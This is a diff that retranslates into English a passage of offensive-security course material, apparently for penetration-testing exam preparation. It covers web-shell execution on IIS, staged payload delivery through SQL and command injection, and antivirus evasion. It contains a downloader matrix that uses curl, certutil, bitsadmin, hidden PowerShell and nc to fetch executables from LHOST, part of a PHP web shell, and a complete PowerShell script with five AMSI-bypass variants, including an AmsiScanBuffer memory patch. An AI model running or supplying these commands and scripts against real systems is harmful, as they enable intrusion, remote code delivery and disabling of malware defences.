-| `m10-managed-loader.aspx` | When all downloads are stopped, use Base64 Send stage 2 directly to memory |
-| `m05-amsi-bypass-variants.ps1` | PowerShell Downloader by AMSI Time-stopped processing |
-| `m09-https-listener.sh` | Yes. HTTPS Starting on delivery TLS Listen |
+| `m00-delivery-server.py` | Delivery + request log (decides "did a request actually go out") |
+| `m10-minimal-exec.aspx` | Long-command execution channel when you have a web shell |
+| `m10-managed-loader.aspx` | When every download is blocked, push stage 2 straight into memory with Base64 |
+| `m05-amsi-bypass-variants.ps1` | What to do when AMSI blocks the PowerShell downloader |
+| `m09-https-listener.sh` | Start a TLS listener when delivery needs HTTPS |
 ````
 
-**Verify**: HTTP 200 and return command output; `whoami ' displays application pool accounts; `w3wp.exe ' appears in `tasklist ' (ASPX executed within w3wp process).
+**Validation**: HTTP 200 with command output; `whoami` shows an app-pool account; `w3wp.exe` appears in `tasklist` (the ASPX runs inside the w3wp process).
 
-**If it fails / alternatives**:
-1. **ASPX was seized** to streamline + code; or to use `.ashx '/`.asmx ' ; or to upload `.config ' to trigger resolution (see the environment).
-2. ** EXE was killed** memory loading (`Assembly.Load ' ) or with PowerShell reflection (if w3wp permits).
-3. ** Upload restricted** (extended white list) to find other upload points, solve loopholes, or inject points (scenario 15/16).
-4. **The application of pool account privileges is too low and the SeImpersonate** is not available to find other service accounts on the server (idS configuration, certificates in connection strings).
+**Failure branches and alternatives**:
+1. **ASPX killed** → strip and encode it; or switch to `.ashx`/`.asmx`; or upload a `.config` to trigger parsing (depends on the environment).
+2. **EXE killed** → load it in memory (`Assembly.Load`), or use PowerShell reflection (if w3wp allows it).
+3. **Uploads restricted** (extension allowlist) → find another upload point, a parsing flaw, or an injection point (scenarios 15/16).
+4. **The app-pool account is too low-privileged and has no SeImpersonate** → hunt for other service accounts on the same server (IIS configuration, credentials in connection strings).
 
-** Test note / OPSEC**: Web Shell is only the "execution portal" and all heavy work is given to the second phase of independence; so each time they are found, they simply need to change one file without retrieving the upload point.
+**Exam / OPSEC notes**: treat the web shell as an execution entry only and hand all the heavy work to an independent stage 2; then every time something gets killed you only swap one file instead of hunting for another upload point.
 
 ---
 
-## Scenario 15: Classic ASP site has SQLi with OS command exec, but downloaders are blocked
+## Scenario 15: A classic ASP site has SQL injection and can run OS commands, but the downloader is blocked
 
-**Situation**: You already have OS command execution via the database, but one system downloader fails while another can fetch the same file. Prepare **transfer fallbacks**, not a new injection toolkit.
+**Situation**: You already have command execution through the database, but one system download tool fails while another can download the same file. → What you need is a **transport fallback route**, not a new injection tool.
 
 **Assumptions**:
 - You can already run OS commands through the injection point (`xp_cmdshell` or equivalent).
-- Target has egress, but some downloaders are blocked by application control / AV / proxy.
+- The target has egress, but some download tools are blocked by application control / AV / a proxy.
 - You already have a validated EXE/script as stage 2.
 
-**Prepare (attacker)**: Prepare the downloader fallback matrix (`m10-download-fallbacks.md`)
+**Prepare (attacker side)**: prepare the downloader fallback matrix (`m10-download-fallbacks.md`)
 
 | Priority | Tool | Command template | Notes |
 |---|---|---|---|
-| 1 | `curl` | `curl -o C:\Windows\Temp\p.exe http://LHOST/p.exe` | Built into Win10+; most often available |
-| 2 | `certutil` | `certutil -urlcache -split -f http://LHOST/p.exe C:\Windows\Temp\p.exe` | Classic; often policy-blocked |
-| 3 | `bitsadmin` | `bitsadmin /transfer j /download /priority normal http://LHOST/p.exe C:\Windows\Temp\p.exe` | Uses BITS service |
+| 1 | `curl` | `curl -o C:\Windows\Temp\p.exe http://LHOST/p.exe` | Built into Win10+, available most often |
+| 2 | `certutil` | `certutil -urlcache -split -f http://LHOST/p.exe C:\Windows\Temp\p.exe` | The classic; often blocked by policy |
+| 3 | `bitsadmin` | `bitsadmin /transfer j /download /priority normal http://LHOST/p.exe C:\Windows\Temp\p.exe` | Goes through the BITS service |
 | 4 | PowerShell | `powershell -nop -w hidden -c "IWR -Uri http://LHOST/p.exe -OutFile C:\Windows\Temp\p.exe"` | Watch AMSI |
 | 5 | `wget`/`nc` | `nc LHOST 80 > p.exe` (needs interaction) | Last resort |
 
 **Procedure**:
-1. Confirm egress: from the injection point run `curl -s -o nul http://LHOST/ping` (success = your delivery log shows the hit).
-2. Walk the matrix one tool at a time — **change only one variable**.
-3. After download, verify: `certutil -hashfile C:\Windows\Temp\p.exe MD5` matches the attacker box.
-4. Then execute; if execution is blocked → hand off to `docs/05` scenarios 18/19.
+1. Confirm egress first: from the injection point run `curl -s -o nul http://LHOST/ping` (a hit in your delivery log means success).
+2. Try the downloaders in matrix order, switching one at a time, **changing only one variable**.
+3. After the download, verify: `certutil -hashfile C:\Windows\Temp\p.exe MD5` must match the attacker box.
+4. Then execute; if execution is blocked → go to the AV-evasion / behavioural handling in scenarios 18/19 of `docs/05`.
 
-**Lab files**:
-| File | Purpose | Key args |
+**Scripts used**:
+| Script | Purpose | Key parameters |
 |---|---|---|
 | `m10-download-fallbacks.md` | Downloader fallback matrix and commands | LHOST/URL |
-| `m10-minimal-exec.aspx` | Alternate exec channel when you have a web shell | `cmd` |
+| `m10-minimal-exec.aspx` | Alternate execution channel when you have a web shell | `cmd` |
 
-**Verify**: Delivery logs show a request from the target IP; file exists on target with matching hash; callback or output after execute.
+**Validation**: a request from the target IP appears in the delivery service log; the file exists on the target with a matching hash; there is a callback or output after execution.
 
-**If it fails / alternatives**:
-1. **Every downloader blocked** → switch to an upload channel (web shell / upload point) or embed Base64 in chunks.
-2. **Only allowlisted domains egress** → domain fronting / proxy ([09-c2-egress-channels](/modules/09-c2-egress-channels)).
-3. **Command escaped/truncated** → shorten it (scenario 16).
+**Failure branches and alternatives**:
+1. **Every downloader is blocked** → switch to an "upload" channel (web shell / upload point) or embed Base64 and write it in chunks.
+2. **Only specific domains may egress** → domain fronting / proxy ([09-c2-egress-channels](/modules/09-c2-egress-channels)).
+3. **The command is escaped/truncated** → switch to a shorter command (scenario 16).
 
-**Exam notes / OPSEC**: A failed downloader **does not mean the network is dead** — read the delivery log first to separate "never requested" (tool blocked) from "requested but no return" (network/proxy).
+**Exam / OPSEC notes**: a failed downloader **does not mean the network is down** — read the delivery log first and separate "no request was made" (the tool is blocked) from "it requested but nothing came back" (a network/proxy problem).
 
 ---
 
 ## Scenario 16: Web command injection only accepts very short commands
 
-**Situation**: An internal page (ping, etc.) is injectable, but argument length is capped; complex quotes and nested commands get truncated.
+**Situation**: An internal page offers ping and similar features and is command-injectable, but the argument length is limited — complex quotes and nested commands are easily truncated.
 
 **Assumptions**:
-- Injection exists, but length/charset is limited (often < 100 characters).
-- Target has egress (otherwise embed).
+- The injection point exists, but length and character set are limited (often <100 characters).
+- The target has egress (otherwise fall back to embedding).
 
-**Prepare (attacker)**:
-1. Prepare an **extremely short stage 1** (turn long commands into "download a script, then run it"):
+**Prepare (attacker side)**:
+1. Prepare an **extremely short stage 1** (replace long commands with "download a script, then run it"):
    ```text
-   # download only (~40 chars)
+   # download only first (~40 characters)
    certutil -urlcache -f http://LHOST/a a
    # then execute
    a
    ```
-2. Prepare encoded-argument variants for the target interpreter (Base64 args; avoid quotes).
-3. Stage-2 script pre-staged with a short filename (`a`, `b`).
+2. Prepare encoded-argument variants suited to the target interpreter (pass Base64; avoid quotes).
+3. Put the stage-2 script in place in advance, with the shortest possible filename (`a`, `b`).
 
 **Procedure**:
-1. Measure the length ceiling: grow a harmless command (`echo AAAA...`) until truncation.
-2. Use two steps: first write the file, second only execute.
-3. Confirm each step via the delivery log (did the target actually request?).
-4. If quotes get truncated → Base64/hex args, or write content to a file then execute.
-5. If still too long → concatenate with redirects (`>a`, `>>a`) across multiple injections.
+1. Measure the length ceiling first: grow a harmless command (`echo AAAA...`) step by step to find the boundary.
+2. Use the two-step "download + execute" pattern: the first step only writes the file, the second only executes it.
+3. Confirm every step through the delivery log (did the target really issue the request).
+4. If quotes get truncated → switch to Base64/hex arguments, or write the content into a file and then execute that.
+5. If that is still not enough → concatenate several chunks with redirection (`>a`, `>>a`), writing them over multiple requests.
 
-**Lab files**:
-| File | Purpose | Key args |
+**Scripts used**:
+| Script | Purpose | Key parameters |
 |---|---|---|
 | `m10-download-fallbacks.md` | Short-command download templates | LHOST |
-| `m10-minimal-exec.aspx` | Long-command channel once you have a web shell | `cmd` |
+| `m10-minimal-exec.aspx` | Long-command channel when you have a web shell | `cmd` |
 
-**Verify**: Delivery log shows requests in order; file exists on target; callback/output after execute.
+**Validation**: requests appear in the delivery log in order; the file exists on the target; there is a callback or output after execution.
 
-**If it fails / alternatives**:
-1. **Two-step still truncated** → shorter downloader (`bitsadmin /transfer` is long; prefer `curl -o a http://LHOST/a`).
-2. **No egress** → embed Base64 (length-limited — needs multi-chunk writes).
-3. **Keyword filter** (`curl`/`certutil` blocked) → equivalent tools or encoded args.
+**Failure branches and alternatives**:
+1. **The two-step is still truncated** → use a shorter downloader (`bitsadmin /transfer` is long too; prefer `curl -o a http://LHOST/a`).
+2. **The target has no egress** → embed Base64 (but length is limited, so you need multi-chunk concatenation).
+3. **The injection point filters keywords** (`curl`/`certutil` are filtered) → switch to an equivalent tool or encoded arguments.
 
-**Exam notes / OPSEC**: Spend two minutes measuring the length ceiling — faster than guessing; shorter filenames win.
+**Exam / OPSEC notes**: spend two minutes measuring the length ceiling — far faster than guessing over and over; the shorter the filename, the better.
 
 ---
 
 ## Module cheat sheet
 
-| Goal | Command / tip |
+| Goal | Command / key point |
 |---|---|
-Simplified ASPX Implementation `m10-minimal-exec.aspx ' (plus `?cmd=whoami')
-| Memory loading phase II
-Identity and privileges `whoami /priv ' (focusing on SeImpersonate Privilege) |
-|Curl →Certutil →bitsadmin →PowerShell →nc|
-`certutil-hashfile p.exe MD5'
-The length of the command is limited.
-| Simplified / Encoding / Extension / Memory Loading |
+| Minimal ASPX execution | `m10-minimal-exec.aspx` (add `?cmd=whoami` when you request it) |
+| Load stage 2 in memory | `m10-managed-loader.aspx?b64=...` |
+| Identity and privileges | `whoami /priv` (watch for SeImpersonatePrivilege) |
+| Downloader fallback order | curl → certutil → bitsadmin → PowerShell → nc |
+| Hash verification | `certutil -hashfile p.exe MD5` |
+| Command length limited | short stage 1 + separate download and execute |
+| Killed by AV | strip the fingerprint / encode / change extension / load in memory |
 
-## Related lab files
+## Related scripts
 
-| File | Notes |
+| Script | Notes |
 |---|---|
-`m10-minimal-exec.aspx ' , streamline the implementation portal
-`m10-managed-loader.aspx ' | hosting program load
-`m10-jsp-shell.jsp '
-`m10-php-shell.php ' |PHP Alternative |
-`m10-download-fallbacks.md`
-`m05-amsi-bypass-varians.ps1' | PowerShell while downloading AMSI processing |
-`m00-delivery-server.py`
+| `m10-minimal-exec.aspx` | Minimal execution entry |
+| `m10-managed-loader.aspx` | Managed assembly loading |
+| `m10-jsp-shell.jsp` | JSP fallback |
+| `m10-php-shell.php` | PHP fallback |
+| `m10-download-fallbacks.md` | Downloader fallback matrix |
+| `m05-amsi-bypass-variants.ps1` | AMSI handling for PowerShell downloads |
+| `m00-delivery-server.py` | Delivery and request logging |
 
 #### `m10-php-shell.php` {#m10-php-shell-php}
 
 ````php
 <?php
 /*
-Purpose: streamlining PHP Command execution entrance - overwrite LAMP / nginx+php-fpm / IIS+PHP scenes;pressing PHP_OS AutoSelect
-      /bin/sh -c（Linux）or cmd /c（Windows）；The command execution function is downgraded as available。
-scene: 14 Alternative（Web The entrance exists but runs on PHP）、15/16（Long command routes for injection/upload but stable）
-Dependency: PHP 5.4+；proc_open / shell_exec / exec / system / passthru / popen At least one was not. disable_functions
-Use: 
-  1) Upload to Web Accessible directories (e.g. /var/www/html/shell.php）
-  2) Visits: http://TARGET/shell.php?cmd=id
-  3) None cmd Back on arguments "ready"（Confirm. PHP Parsed and Not WAF Stop!）
-Placeholder: TARGET=Target site；cmd=Command to execute (need) URL Encoded）
-Test status: Not measured at target; used php -l（None PHP Time for Environment python3 Label pair check)
+Purpose: minimal PHP command-execution entry — covers LAMP / nginx+php-fpm / IIS+PHP; it picks
+      /bin/sh -c (Linux) or cmd /c (Windows) automatically from PHP_OS, and degrades through the command-execution functions as they are available.
+Scenario: fallback for 14 (a web entry exists but the runtime is PHP), 15/16 (you have injection/upload but need a stable long-command channel)
+Dependencies: PHP 5.4+; at least one of proc_open / shell_exec / exec / system / passthru / popen is not in disable_functions
+Usage:
+  1) Upload into a web-accessible directory (for example /var/www/html/shell.php)
+  2) Request: http://TARGET/shell.php?cmd=id
+  3) With no cmd parameter it returns "ready" (proof that PHP has parsed it and no WAF blocked it)
+Placeholders: TARGET=target site; cmd=command to run (URL-encode it)
+Test status: not tested on a target; passed a syntax check with php -l (use python3 tag-pairing checks when you have no PHP environment)
 */
 
 if (!isset($_REQUEST['cmd']) || trim($_REQUEST['cmd']) === '') {
@@ -806,17 +804,17 @@ echo "no command execution function available (check disable_functions)";
 
 ````powershell
 <#
-Use: AMSI Multiple experimental versions processed by host（PowerShell / WSH / .NET）Select Match Achievement
-scene: 3、7、10、18、19（and M05 All scenes PowerShell Front of the route）
-Dependency: PowerShell 3.0+；Partial version requires reflect permission（CLM It'll fail. See you. m05-clm-bypass-runspace.ps1）
-Use: powershell -ep bypass -f m05-amsi-bypass-variants.ps1 -Variant 1
-      or in an existing session: . .\m05-amsi-bypass-variants.ps1; Invoke-AmsiVariant -Variant 2
-Placeholder: None (pure local operation, not involved) LHOST/LPORT）
-Test status: Not present Windows Measurement; syntax has been manually checked. The test must be tested on a case-by-case basis in an experimental environment.
-Annotations: 
-  - AMSI The treatment changes with the patch, and the failure of one version does not mean that the technology is not available.。
-  - First."The probe."Decision AMSI Whether or not to enter into force, to decide whether to proceed。
-  - PowerShell Host PS Version；WSH（.js/.vbs）I have to. WSH It's a special version. It can't be copied.。
+Purpose: several experimental AMSI-handling variants; pick the implementation that matches the host (PowerShell / WSH / .NET)
+Scenario: 3, 7, 10, 18, 19 (and a prerequisite for the PowerShell route in every M05 scenario)
+Dependencies: PowerShell 3.0+; some variants need reflection rights (they fail under CLM — see m05-clm-bypass-runspace.ps1)
+Usage: powershell -ep bypass -f m05-amsi-bypass-variants.ps1 -Variant 1
+      or inside an existing session: . .\m05-amsi-bypass-variants.ps1; Invoke-AmsiVariant -Variant 2
+Placeholders: none (purely local; LHOST/LPORT are not involved)
+Test status: not tested on Windows; syntax checked by hand. Before the exam you must validate every variant's effectiveness in the lab environment
+Notes:
+  - How AMSI is handled changes with every patch; one variant failing does not mean the technique is unusable — just switch to the next variant.
+  - Run the "probe" first to decide whether AMSI is active, then decide whether you need to handle it.
+  - Use the PS variant for the PowerShell host; WSH (.js/.vbs) must use the WSH-specific variant — do not copy the PS one across.
 #>
 [CmdletBinding()]
 param(
@@ -826,17 +824,17 @@ param(
 
 function Test-AmsiActive {
     <#
-    Innocence probe: includes AMSI Always sweeps the feature string. If you're stopped, explain. AMSI Entry into force。
+    Harmless probe: contains strings that AMSI commonly scans for. If it gets blocked, AMSI is active.
     #>
     $probe = 'Invoke-Mimikatz'
     $marker = 'AmsiUtils' + 'amsiInitFailed'
-    Write-Output ("[*] Probe String: {0} / {1}" -f $probe, $marker)
+    Write-Output ("[*] Probe strings: {0} / {1}" -f $probe, $marker)
     try {
         $sb = [scriptblock]::Create($probe)
-        Write-Output "[+] The probe is not intercepted.（AMSI May not be effective or have been addressed）"
+        Write-Output "[+] Probe was not blocked (AMSI may be inactive or already handled)"
         return $false
     } catch {
-        Write-Output ("[!] The probe is intercepted.: {0}" -f $_.Exception.Message)
+        Write-Output ("[!] Probe blocked: {0}" -f $_.Exception.Message)
         return $true
     }
 }
@@ -844,39 +842,39 @@ function Test-AmsiActive {
 function Invoke-AmsiVariant {
     param([int]$Variant)
 
-    Write-Output ("[*] Apply AMSI Process Version {0}" -f $Variant)
+    Write-Output ("[*] Applying AMSI variant {0}" -f $Variant)
 
     switch ($Variant) {
         1 {
-            # Version 1: Reflection Settings amsiInitFailed（It's classic. It's always stopped, but try first.）
+            # Variant 1: set amsiInitFailed via reflection (the most classic; often blocked, but try it first)
             try {
                 $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*iUtils' }
                 $f = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*Failed' }
                 $f.SetValue($null, $true)
-                Write-Output "[+] Version 1 Completed"
-            } catch { Write-Output ("[-] Version 1 Failed: {0}" -f $_.Exception.Message) }
+                Write-Output "[+] Variant 1 done"
+            } catch { Write-Output ("[-] Variant 1 failed: {0}" -f $_.Exception.Message) }
         }
         2 {
-            # Version 2: Avoid static features by string spell
+            # Variant 2: dodge static signatures by concatenating strings
             try {
                 $s = 'S'+'y'+'s'+'t'+'e'+'m'+'.'+'M'+'a'+'n'+'a'+'g'+'e'+'m'+'e'+'n'+'t'+'.'+'A'+'u'+'t'+'o'+'m'+'a'+'t'+'i'+'o'+'n'
                 $t = [type]($s + '.AmsiUtils')
                 $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
                 $f.SetValue($null, $true)
-                Write-Output "[+] Version 2 Completed"
-            } catch { Write-Output ("[-] Version 2 Failed: {0}" -f $_.Exception.Message) }
+                Write-Output "[+] Variant 2 done"
+            } catch { Write-Output ("[-] Variant 2 failed: {0}" -f $_.Exception.Message) }
         }
         3 {
-            # Version 3: Destruction amsiContext（Reflect empty context）
+            # Variant 3: wreck amsiContext (null the context via reflection)
             try {
                 $t = [Ref].Assembly.GetType(('System.Management.Automation.'+'AmsiUtils'))
                 $ctx = $t.GetField('amsiContext', 'NonPublic,Static')
                 $ctx.SetValue($null, [IntPtr]::Zero)
-                Write-Output "[+] Version 3 Completed"
-            } catch { Write-Output ("[-] Version 3 Failed: {0}" -f $_.Exception.Message) }
+                Write-Output "[+] Variant 3 done"
+            } catch { Write-Output ("[-] Variant 3 failed: {0}" -f $_.Exception.Message) }
         }
         4 {
-            # Version 4: Memory Patch AmsiScanBuffer The first bytes should read ret）
+            # Variant 4: in-memory patch (change the first bytes of AmsiScanBuffer to ret)
             try {
                 $k = @"
 using System;
@@ -897,11 +895,11 @@ public class P {
 "@
                 Add-Type -TypeDefinition $k -ErrorAction Stop
                 [P]::Patch()
-                Write-Output "[+] Version 4 Completed (to allow) Add-Type）"
-            } catch { Write-Output ("[-] Version 4 Failed（Add-Type Could be stopped.）: {0}" -f $_.Exception.Message) }
+                Write-Output "[+] Variant 4 done (requires Add-Type to be allowed)"
+            } catch { Write-Output ("[-] Variant 4 failed (Add-Type may be blocked): {0}" -f $_.Exception.Message) }
         }
         5 {
-            # Version 5: Custom Runspace Internal Version（CLM Co-use in Environment）
+            # Variant 5: custom Runspace variant (use it together with a CLM bypass)
             try {
                 $rs = [runspacefactory]::CreateRunspace()
                 $rs.Open()
@@ -909,12 +907,12 @@ public class P {
                 $ps.Runspace = $rs
                 [void]$ps.AddScript({ $ExecutionContext.SessionState.LanguageMode = 'FullLanguage' })
                 [void]$ps.Invoke()
-                Write-Output "[+] Version 5 Completed (new) Runspace Language mode has been released）"
-            } catch { Write-Output ("[-] Version 5 Failed: {0}" -f $_.Exception.Message) }
+                Write-Output "[+] Variant 5 done (language mode opened up in the new Runspace)"
+            } catch { Write-Output ("[-] Variant 5 failed: {0}" -f $_.Exception.Message) }
         }
         6 {
-            # Version 6: Not processed, only reported (for comparison experiments)）
-            Write-Output "[*] Version 6: No processing, as a control group"
+            # Variant 6: do nothing, just report (control group for comparison)
+            Write-Output "[*] Variant 6: nothing was done; this is the control group"
         }
     }
 }
@@ -925,10 +923,10 @@ if ($ProbeOnly) {
     [void](Test-AmsiActive)
     Invoke-AmsiVariant -Variant $Variant
     Write-Output ""
-    Write-Output "[*] Repeat: "
+    Write-Output "[*] Re-test:"
     [void](Test-AmsiActive)
-    Write-Output "[*] Hint: Version 1/2/3 In the reflect class, patches often fail; version 4 Yes. Add-Type；"
-    Write-Output "    Version 5 and CLM circumventing collaboration; consider moving to hosting set or not when all lapses PowerShell Route。"
+    Write-Output "[*] Hints: variants 1/2/3 are reflection-based and often break after patching; variant 4 needs Add-Type;"
+    Write-Output "    variant 5 works together with a CLM bypass; if all of them fail, consider a managed assembly or a non-PowerShell route."
 }
 ````
 
